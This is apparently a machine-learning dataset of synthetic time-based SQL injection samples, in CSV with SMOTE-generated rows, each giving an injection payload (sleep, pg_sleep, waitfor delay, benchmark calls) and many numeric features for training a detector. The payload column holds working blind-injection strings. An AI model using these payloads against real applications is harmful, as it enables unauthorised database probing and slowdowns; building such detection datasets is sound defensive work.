id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.22388044178585303,41.784096004846226,16.0,2.8438537442022547,10.999999999999998,0.0,21.005169458510547,9.778926546335677,0.26553411624032813,-1.3877787807814457e-17,0.4999797780591109,0.23448610570056094,1.0,0.0,0.0,0.0,0.0,1.0,0.0,3.7789265463356774,0.0,4.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000012,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000099,0.4147249841576181,47.83341740642322,21.91670870321161,4.07513002057911,27.0,3.0832912967883885,9.750126109634834,8.0,0.5645370154105855,0.06453701541058558,0.2036557423905072,0.16727022678832165,2.0,3.0832912967883894,0.0,0.0,0.0,0.0,0.0,0.9167087032116115,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9167087032116116,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000013,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,0.4503346383833847,99.30175202885394,32.0,3.809677592370943,30.162719003606743,18.0,39.97631402164046,11.162719003606744,0.3038981422302505,0.18141783437433856,0.4022824841158511,0.11240153927955983,1.0,0.0,2.0,0.0,0.0,2.0,0.0,5.162719003606743,0.0,1.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.16271900360674368,0.8372809963932564,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000014,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.24280429148715682,86.86101842551479,27.07593210496568,3.8442930818353434,20.84813579006864,28.46847526524023,29.620339475171594,7.9240678950343195,0.24027935283160487,0.3274060225717951,0.341027291570619,0.09128733302598098,0.0,0.0,0.0,0.0,0.0,1.924067895034319,0.0,4.0,0.0,0.0,1.0,1.924067895034319,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.9240678950343191,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.924067895034319
SMOTE_000015,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.4566230534936783,85.86459096038038,27.873843440042265,3.5153614605066053,16.883095919704143,20.243060640253592,36.86459096038039,11.873843440042265,0.19790685081759124,0.23518860382170267,0.4285831059620747,0.13832143939863137,1.2523131199154691,0.0,0.0,0.0,0.0,1.0,0.0,6.747686880084531,0.9999999999999999,0.0,1.0,1.0,1.0,0.0,0.0,0.8738434400422652,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.12615655995773462,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.126156559957735
SMOTE_000016,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.05878462441648502,81.86769476410295,19.955898254700983,2.9289458756918125,27.955898254700983,1.9852994182336614,41.91179650940197,10.014700581766338,0.34147814959749384,0.02423307096006587,0.5119151576476174,0.12237362179482295,0.0,0.0,0.029401163532676855,0.0,1.0,0.0,0.0,8.985299418233662,0.0,0.0,0.0,1.0294011635326767,0.0,0.0,0.014700581766338428,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.9852994182336615,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.985299418233662
SMOTE_000017,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.2916900868650891,86.2096902413024,28.344193804826048,4.1326326012706875,43.94903892547724,3.344193804826048,23.883876096520957,15.032581414478145,0.5090907961773652,0.0400828524916685,0.2685936812273542,0.18223267010361205,4.0,0.0,2.0,0.0,0.0,0.0,0.0,3.376775219304192,0.0,0.6558061951739521,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000018,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.09166240099502969,37.03629810586012,16.0,3.009007272623203,10.999999999999998,0.0,17.12060754115828,8.91569056470184,0.3034888959560601,-1.3877787807814457e-17,0.4544967775733164,0.2420143264706235,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.9156905647018396,0.0,4.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000019,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000116,1.2198408366335796,44.55670238728243,16.0,2.957068576353454,14.0,1.0,21.223166671879646,8.333535715402782,0.3254285118008238,0.023244893700058847,0.4639172327579132,0.18740936174120415,0.0,3.0,0.0,0.0,0.0,1.0,0.0,3.333535715402781,0.9999999999999999,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000020,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,1.0924368016858763,73.70769511868839,23.0,3.3015915083480887,19.0,10.0,34.08974593224032,10.617949186448064,0.2591557130217632,0.13639774369566482,0.4605128338985161,0.14393370938405586,0.3089745932240321,0.6910254067759678,2.0,0.0,0.0,1.0,0.0,5.617949186448064,0.0,1.0,0.0,3.0,0.3089745932240322,0.691025406775968,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000021,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.5122458015718343,37.035813797968096,23.0,4.207366756043845,16.0,2.0,6.696511498306748,12.33930229966135,0.4344438879669062,0.054305485995863274,0.17714204421665214,0.33410858182057845,2.0,0.0,2.0,0.0,0.0,0.0,0.0,1.33930229966135,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000022,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,2.5730137308775665,97.78249068676763,27.826263969848544,3.6672688665998163,25.0,18.0,39.0,15.782490686767638,0.2556948591930448,0.18410029861899224,0.39888398034114986,0.1613208618468131,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,4.7824906867676376,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.3912453433838189,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000023,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,1.9973425493892034,60.04364820887445,20.395635179112556,3.379270942669449,23.604364820887447,1.79127035822511,24.6480130297619,10.0,0.3951480878251764,0.031422932499286044,0.4057312025021419,0.16769777717339568,3.7912703582251095,0.0,0.0,0.0,0.0,1.0,0.0,3.8130944626623355,0.0,0.6043648208874453,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.6043648208874454,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3956351791125546,0.3956351791125546,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3956351791125545
SMOTE_000024,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000154,1.3494357341405785,41.8925109455908,20.135265462229643,4.083975851942987,23.973429117803747,4.0,6.135265462229643,7.78381636555741,0.5641545441932535,0.10018514993368502,0.14329680728134292,0.19236349859171858,2.216183634442589,3.1352654622296425,0.432367268885179,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.43236726888517896,1.0,0.7838163655574104,0.2161836344425895,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.7838163655574105,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7838163655574104
SMOTE_000025,attack,time, (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,nearest_attack_euclidean,R000132,1.1159655291340156,154.00862158353328,27.06866822125747,3.7622565552066534,68.28329446856318,16.51932245119769,54.13733644251495,15.068668221257473,0.44223654483386465,0.10689823013662296,0.3526629779689851,0.09820224706052727,0.13733644251494503,0.0,0.0,0.0,1.0,1.0,0.0,10.0,0.0,1.862663557485055,0.0,2.137336442514945,0.06866822125747252,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0686682212574725,0.0,0.06866822125747252,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.9313317787425275,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9313317787425275,0.9313317787425275,6.9313317787425275
SMOTE_000026,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,3.5783049873420945,36.04466475855308,23.522332379276545,4.293996131222081,16.0,2.0,5.522332379276545,12.522332379276545,0.44423580221092707,0.05552947527636589,0.15294077952271323,0.34729394298999383,2.0,0.5223323792765449,2.0,0.0,0.0,0.0,0.522332379276545,1.0,0.0,4.0,0.4776676207234552,2.0,1.0,0.5223323792765449,1.0,0.0,0.0,0.0,1.0,0.522332379276545,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000027,attack,time,1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000120,1.9248541560833259,108.59099424583181,26.466806143108563,3.43875426109244,39.82869097980734,6.743036469711009,47.104921306409786,14.91434548990367,0.36873284610283075,0.05801108704565042,0.4355960760744993,0.13765999077701954,3.0,0.0,0.0,0.0,1.0,1.0,0.0,8.638115163301222,0.0,0.0,0.0,2.638115163301223,1.0,0.0,0.0,0.6381151633012231,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.638115163301223,0.0,0.6381151633012232,1.0,0.36188483669877675,0.6381151633012232,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.276230326602446
SMOTE_000028,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,1.9826864399906428,89.47731050307966,25.053034500342186,3.5149757110235513,21.73865525153983,20.053034500342186,36.10606900068437,11.579551750513277,0.24030333438403473,0.2252772781210282,0.4053899187436277,0.12902946875130938,2.579551750513277,0.0,0.0,0.0,0.0,1.526517250171092,0.0,6.0,0.0,0.0,1.0,1.5265172501710922,1.0,0.0,0.0,0.4734827498289078,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.5265172501710922,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.526517250171092
SMOTE_000029,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,1.8526265273223432,64.97325077591685,19.486625387958426,2.899447155004214,10.486625387958426,10.0,34.0,10.486625387958425,0.16131901445790026,0.15394590251913626,0.5234160685650633,0.16131901445790026,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.4866253879584252,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.48662538795842525,0.5133746120415748,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
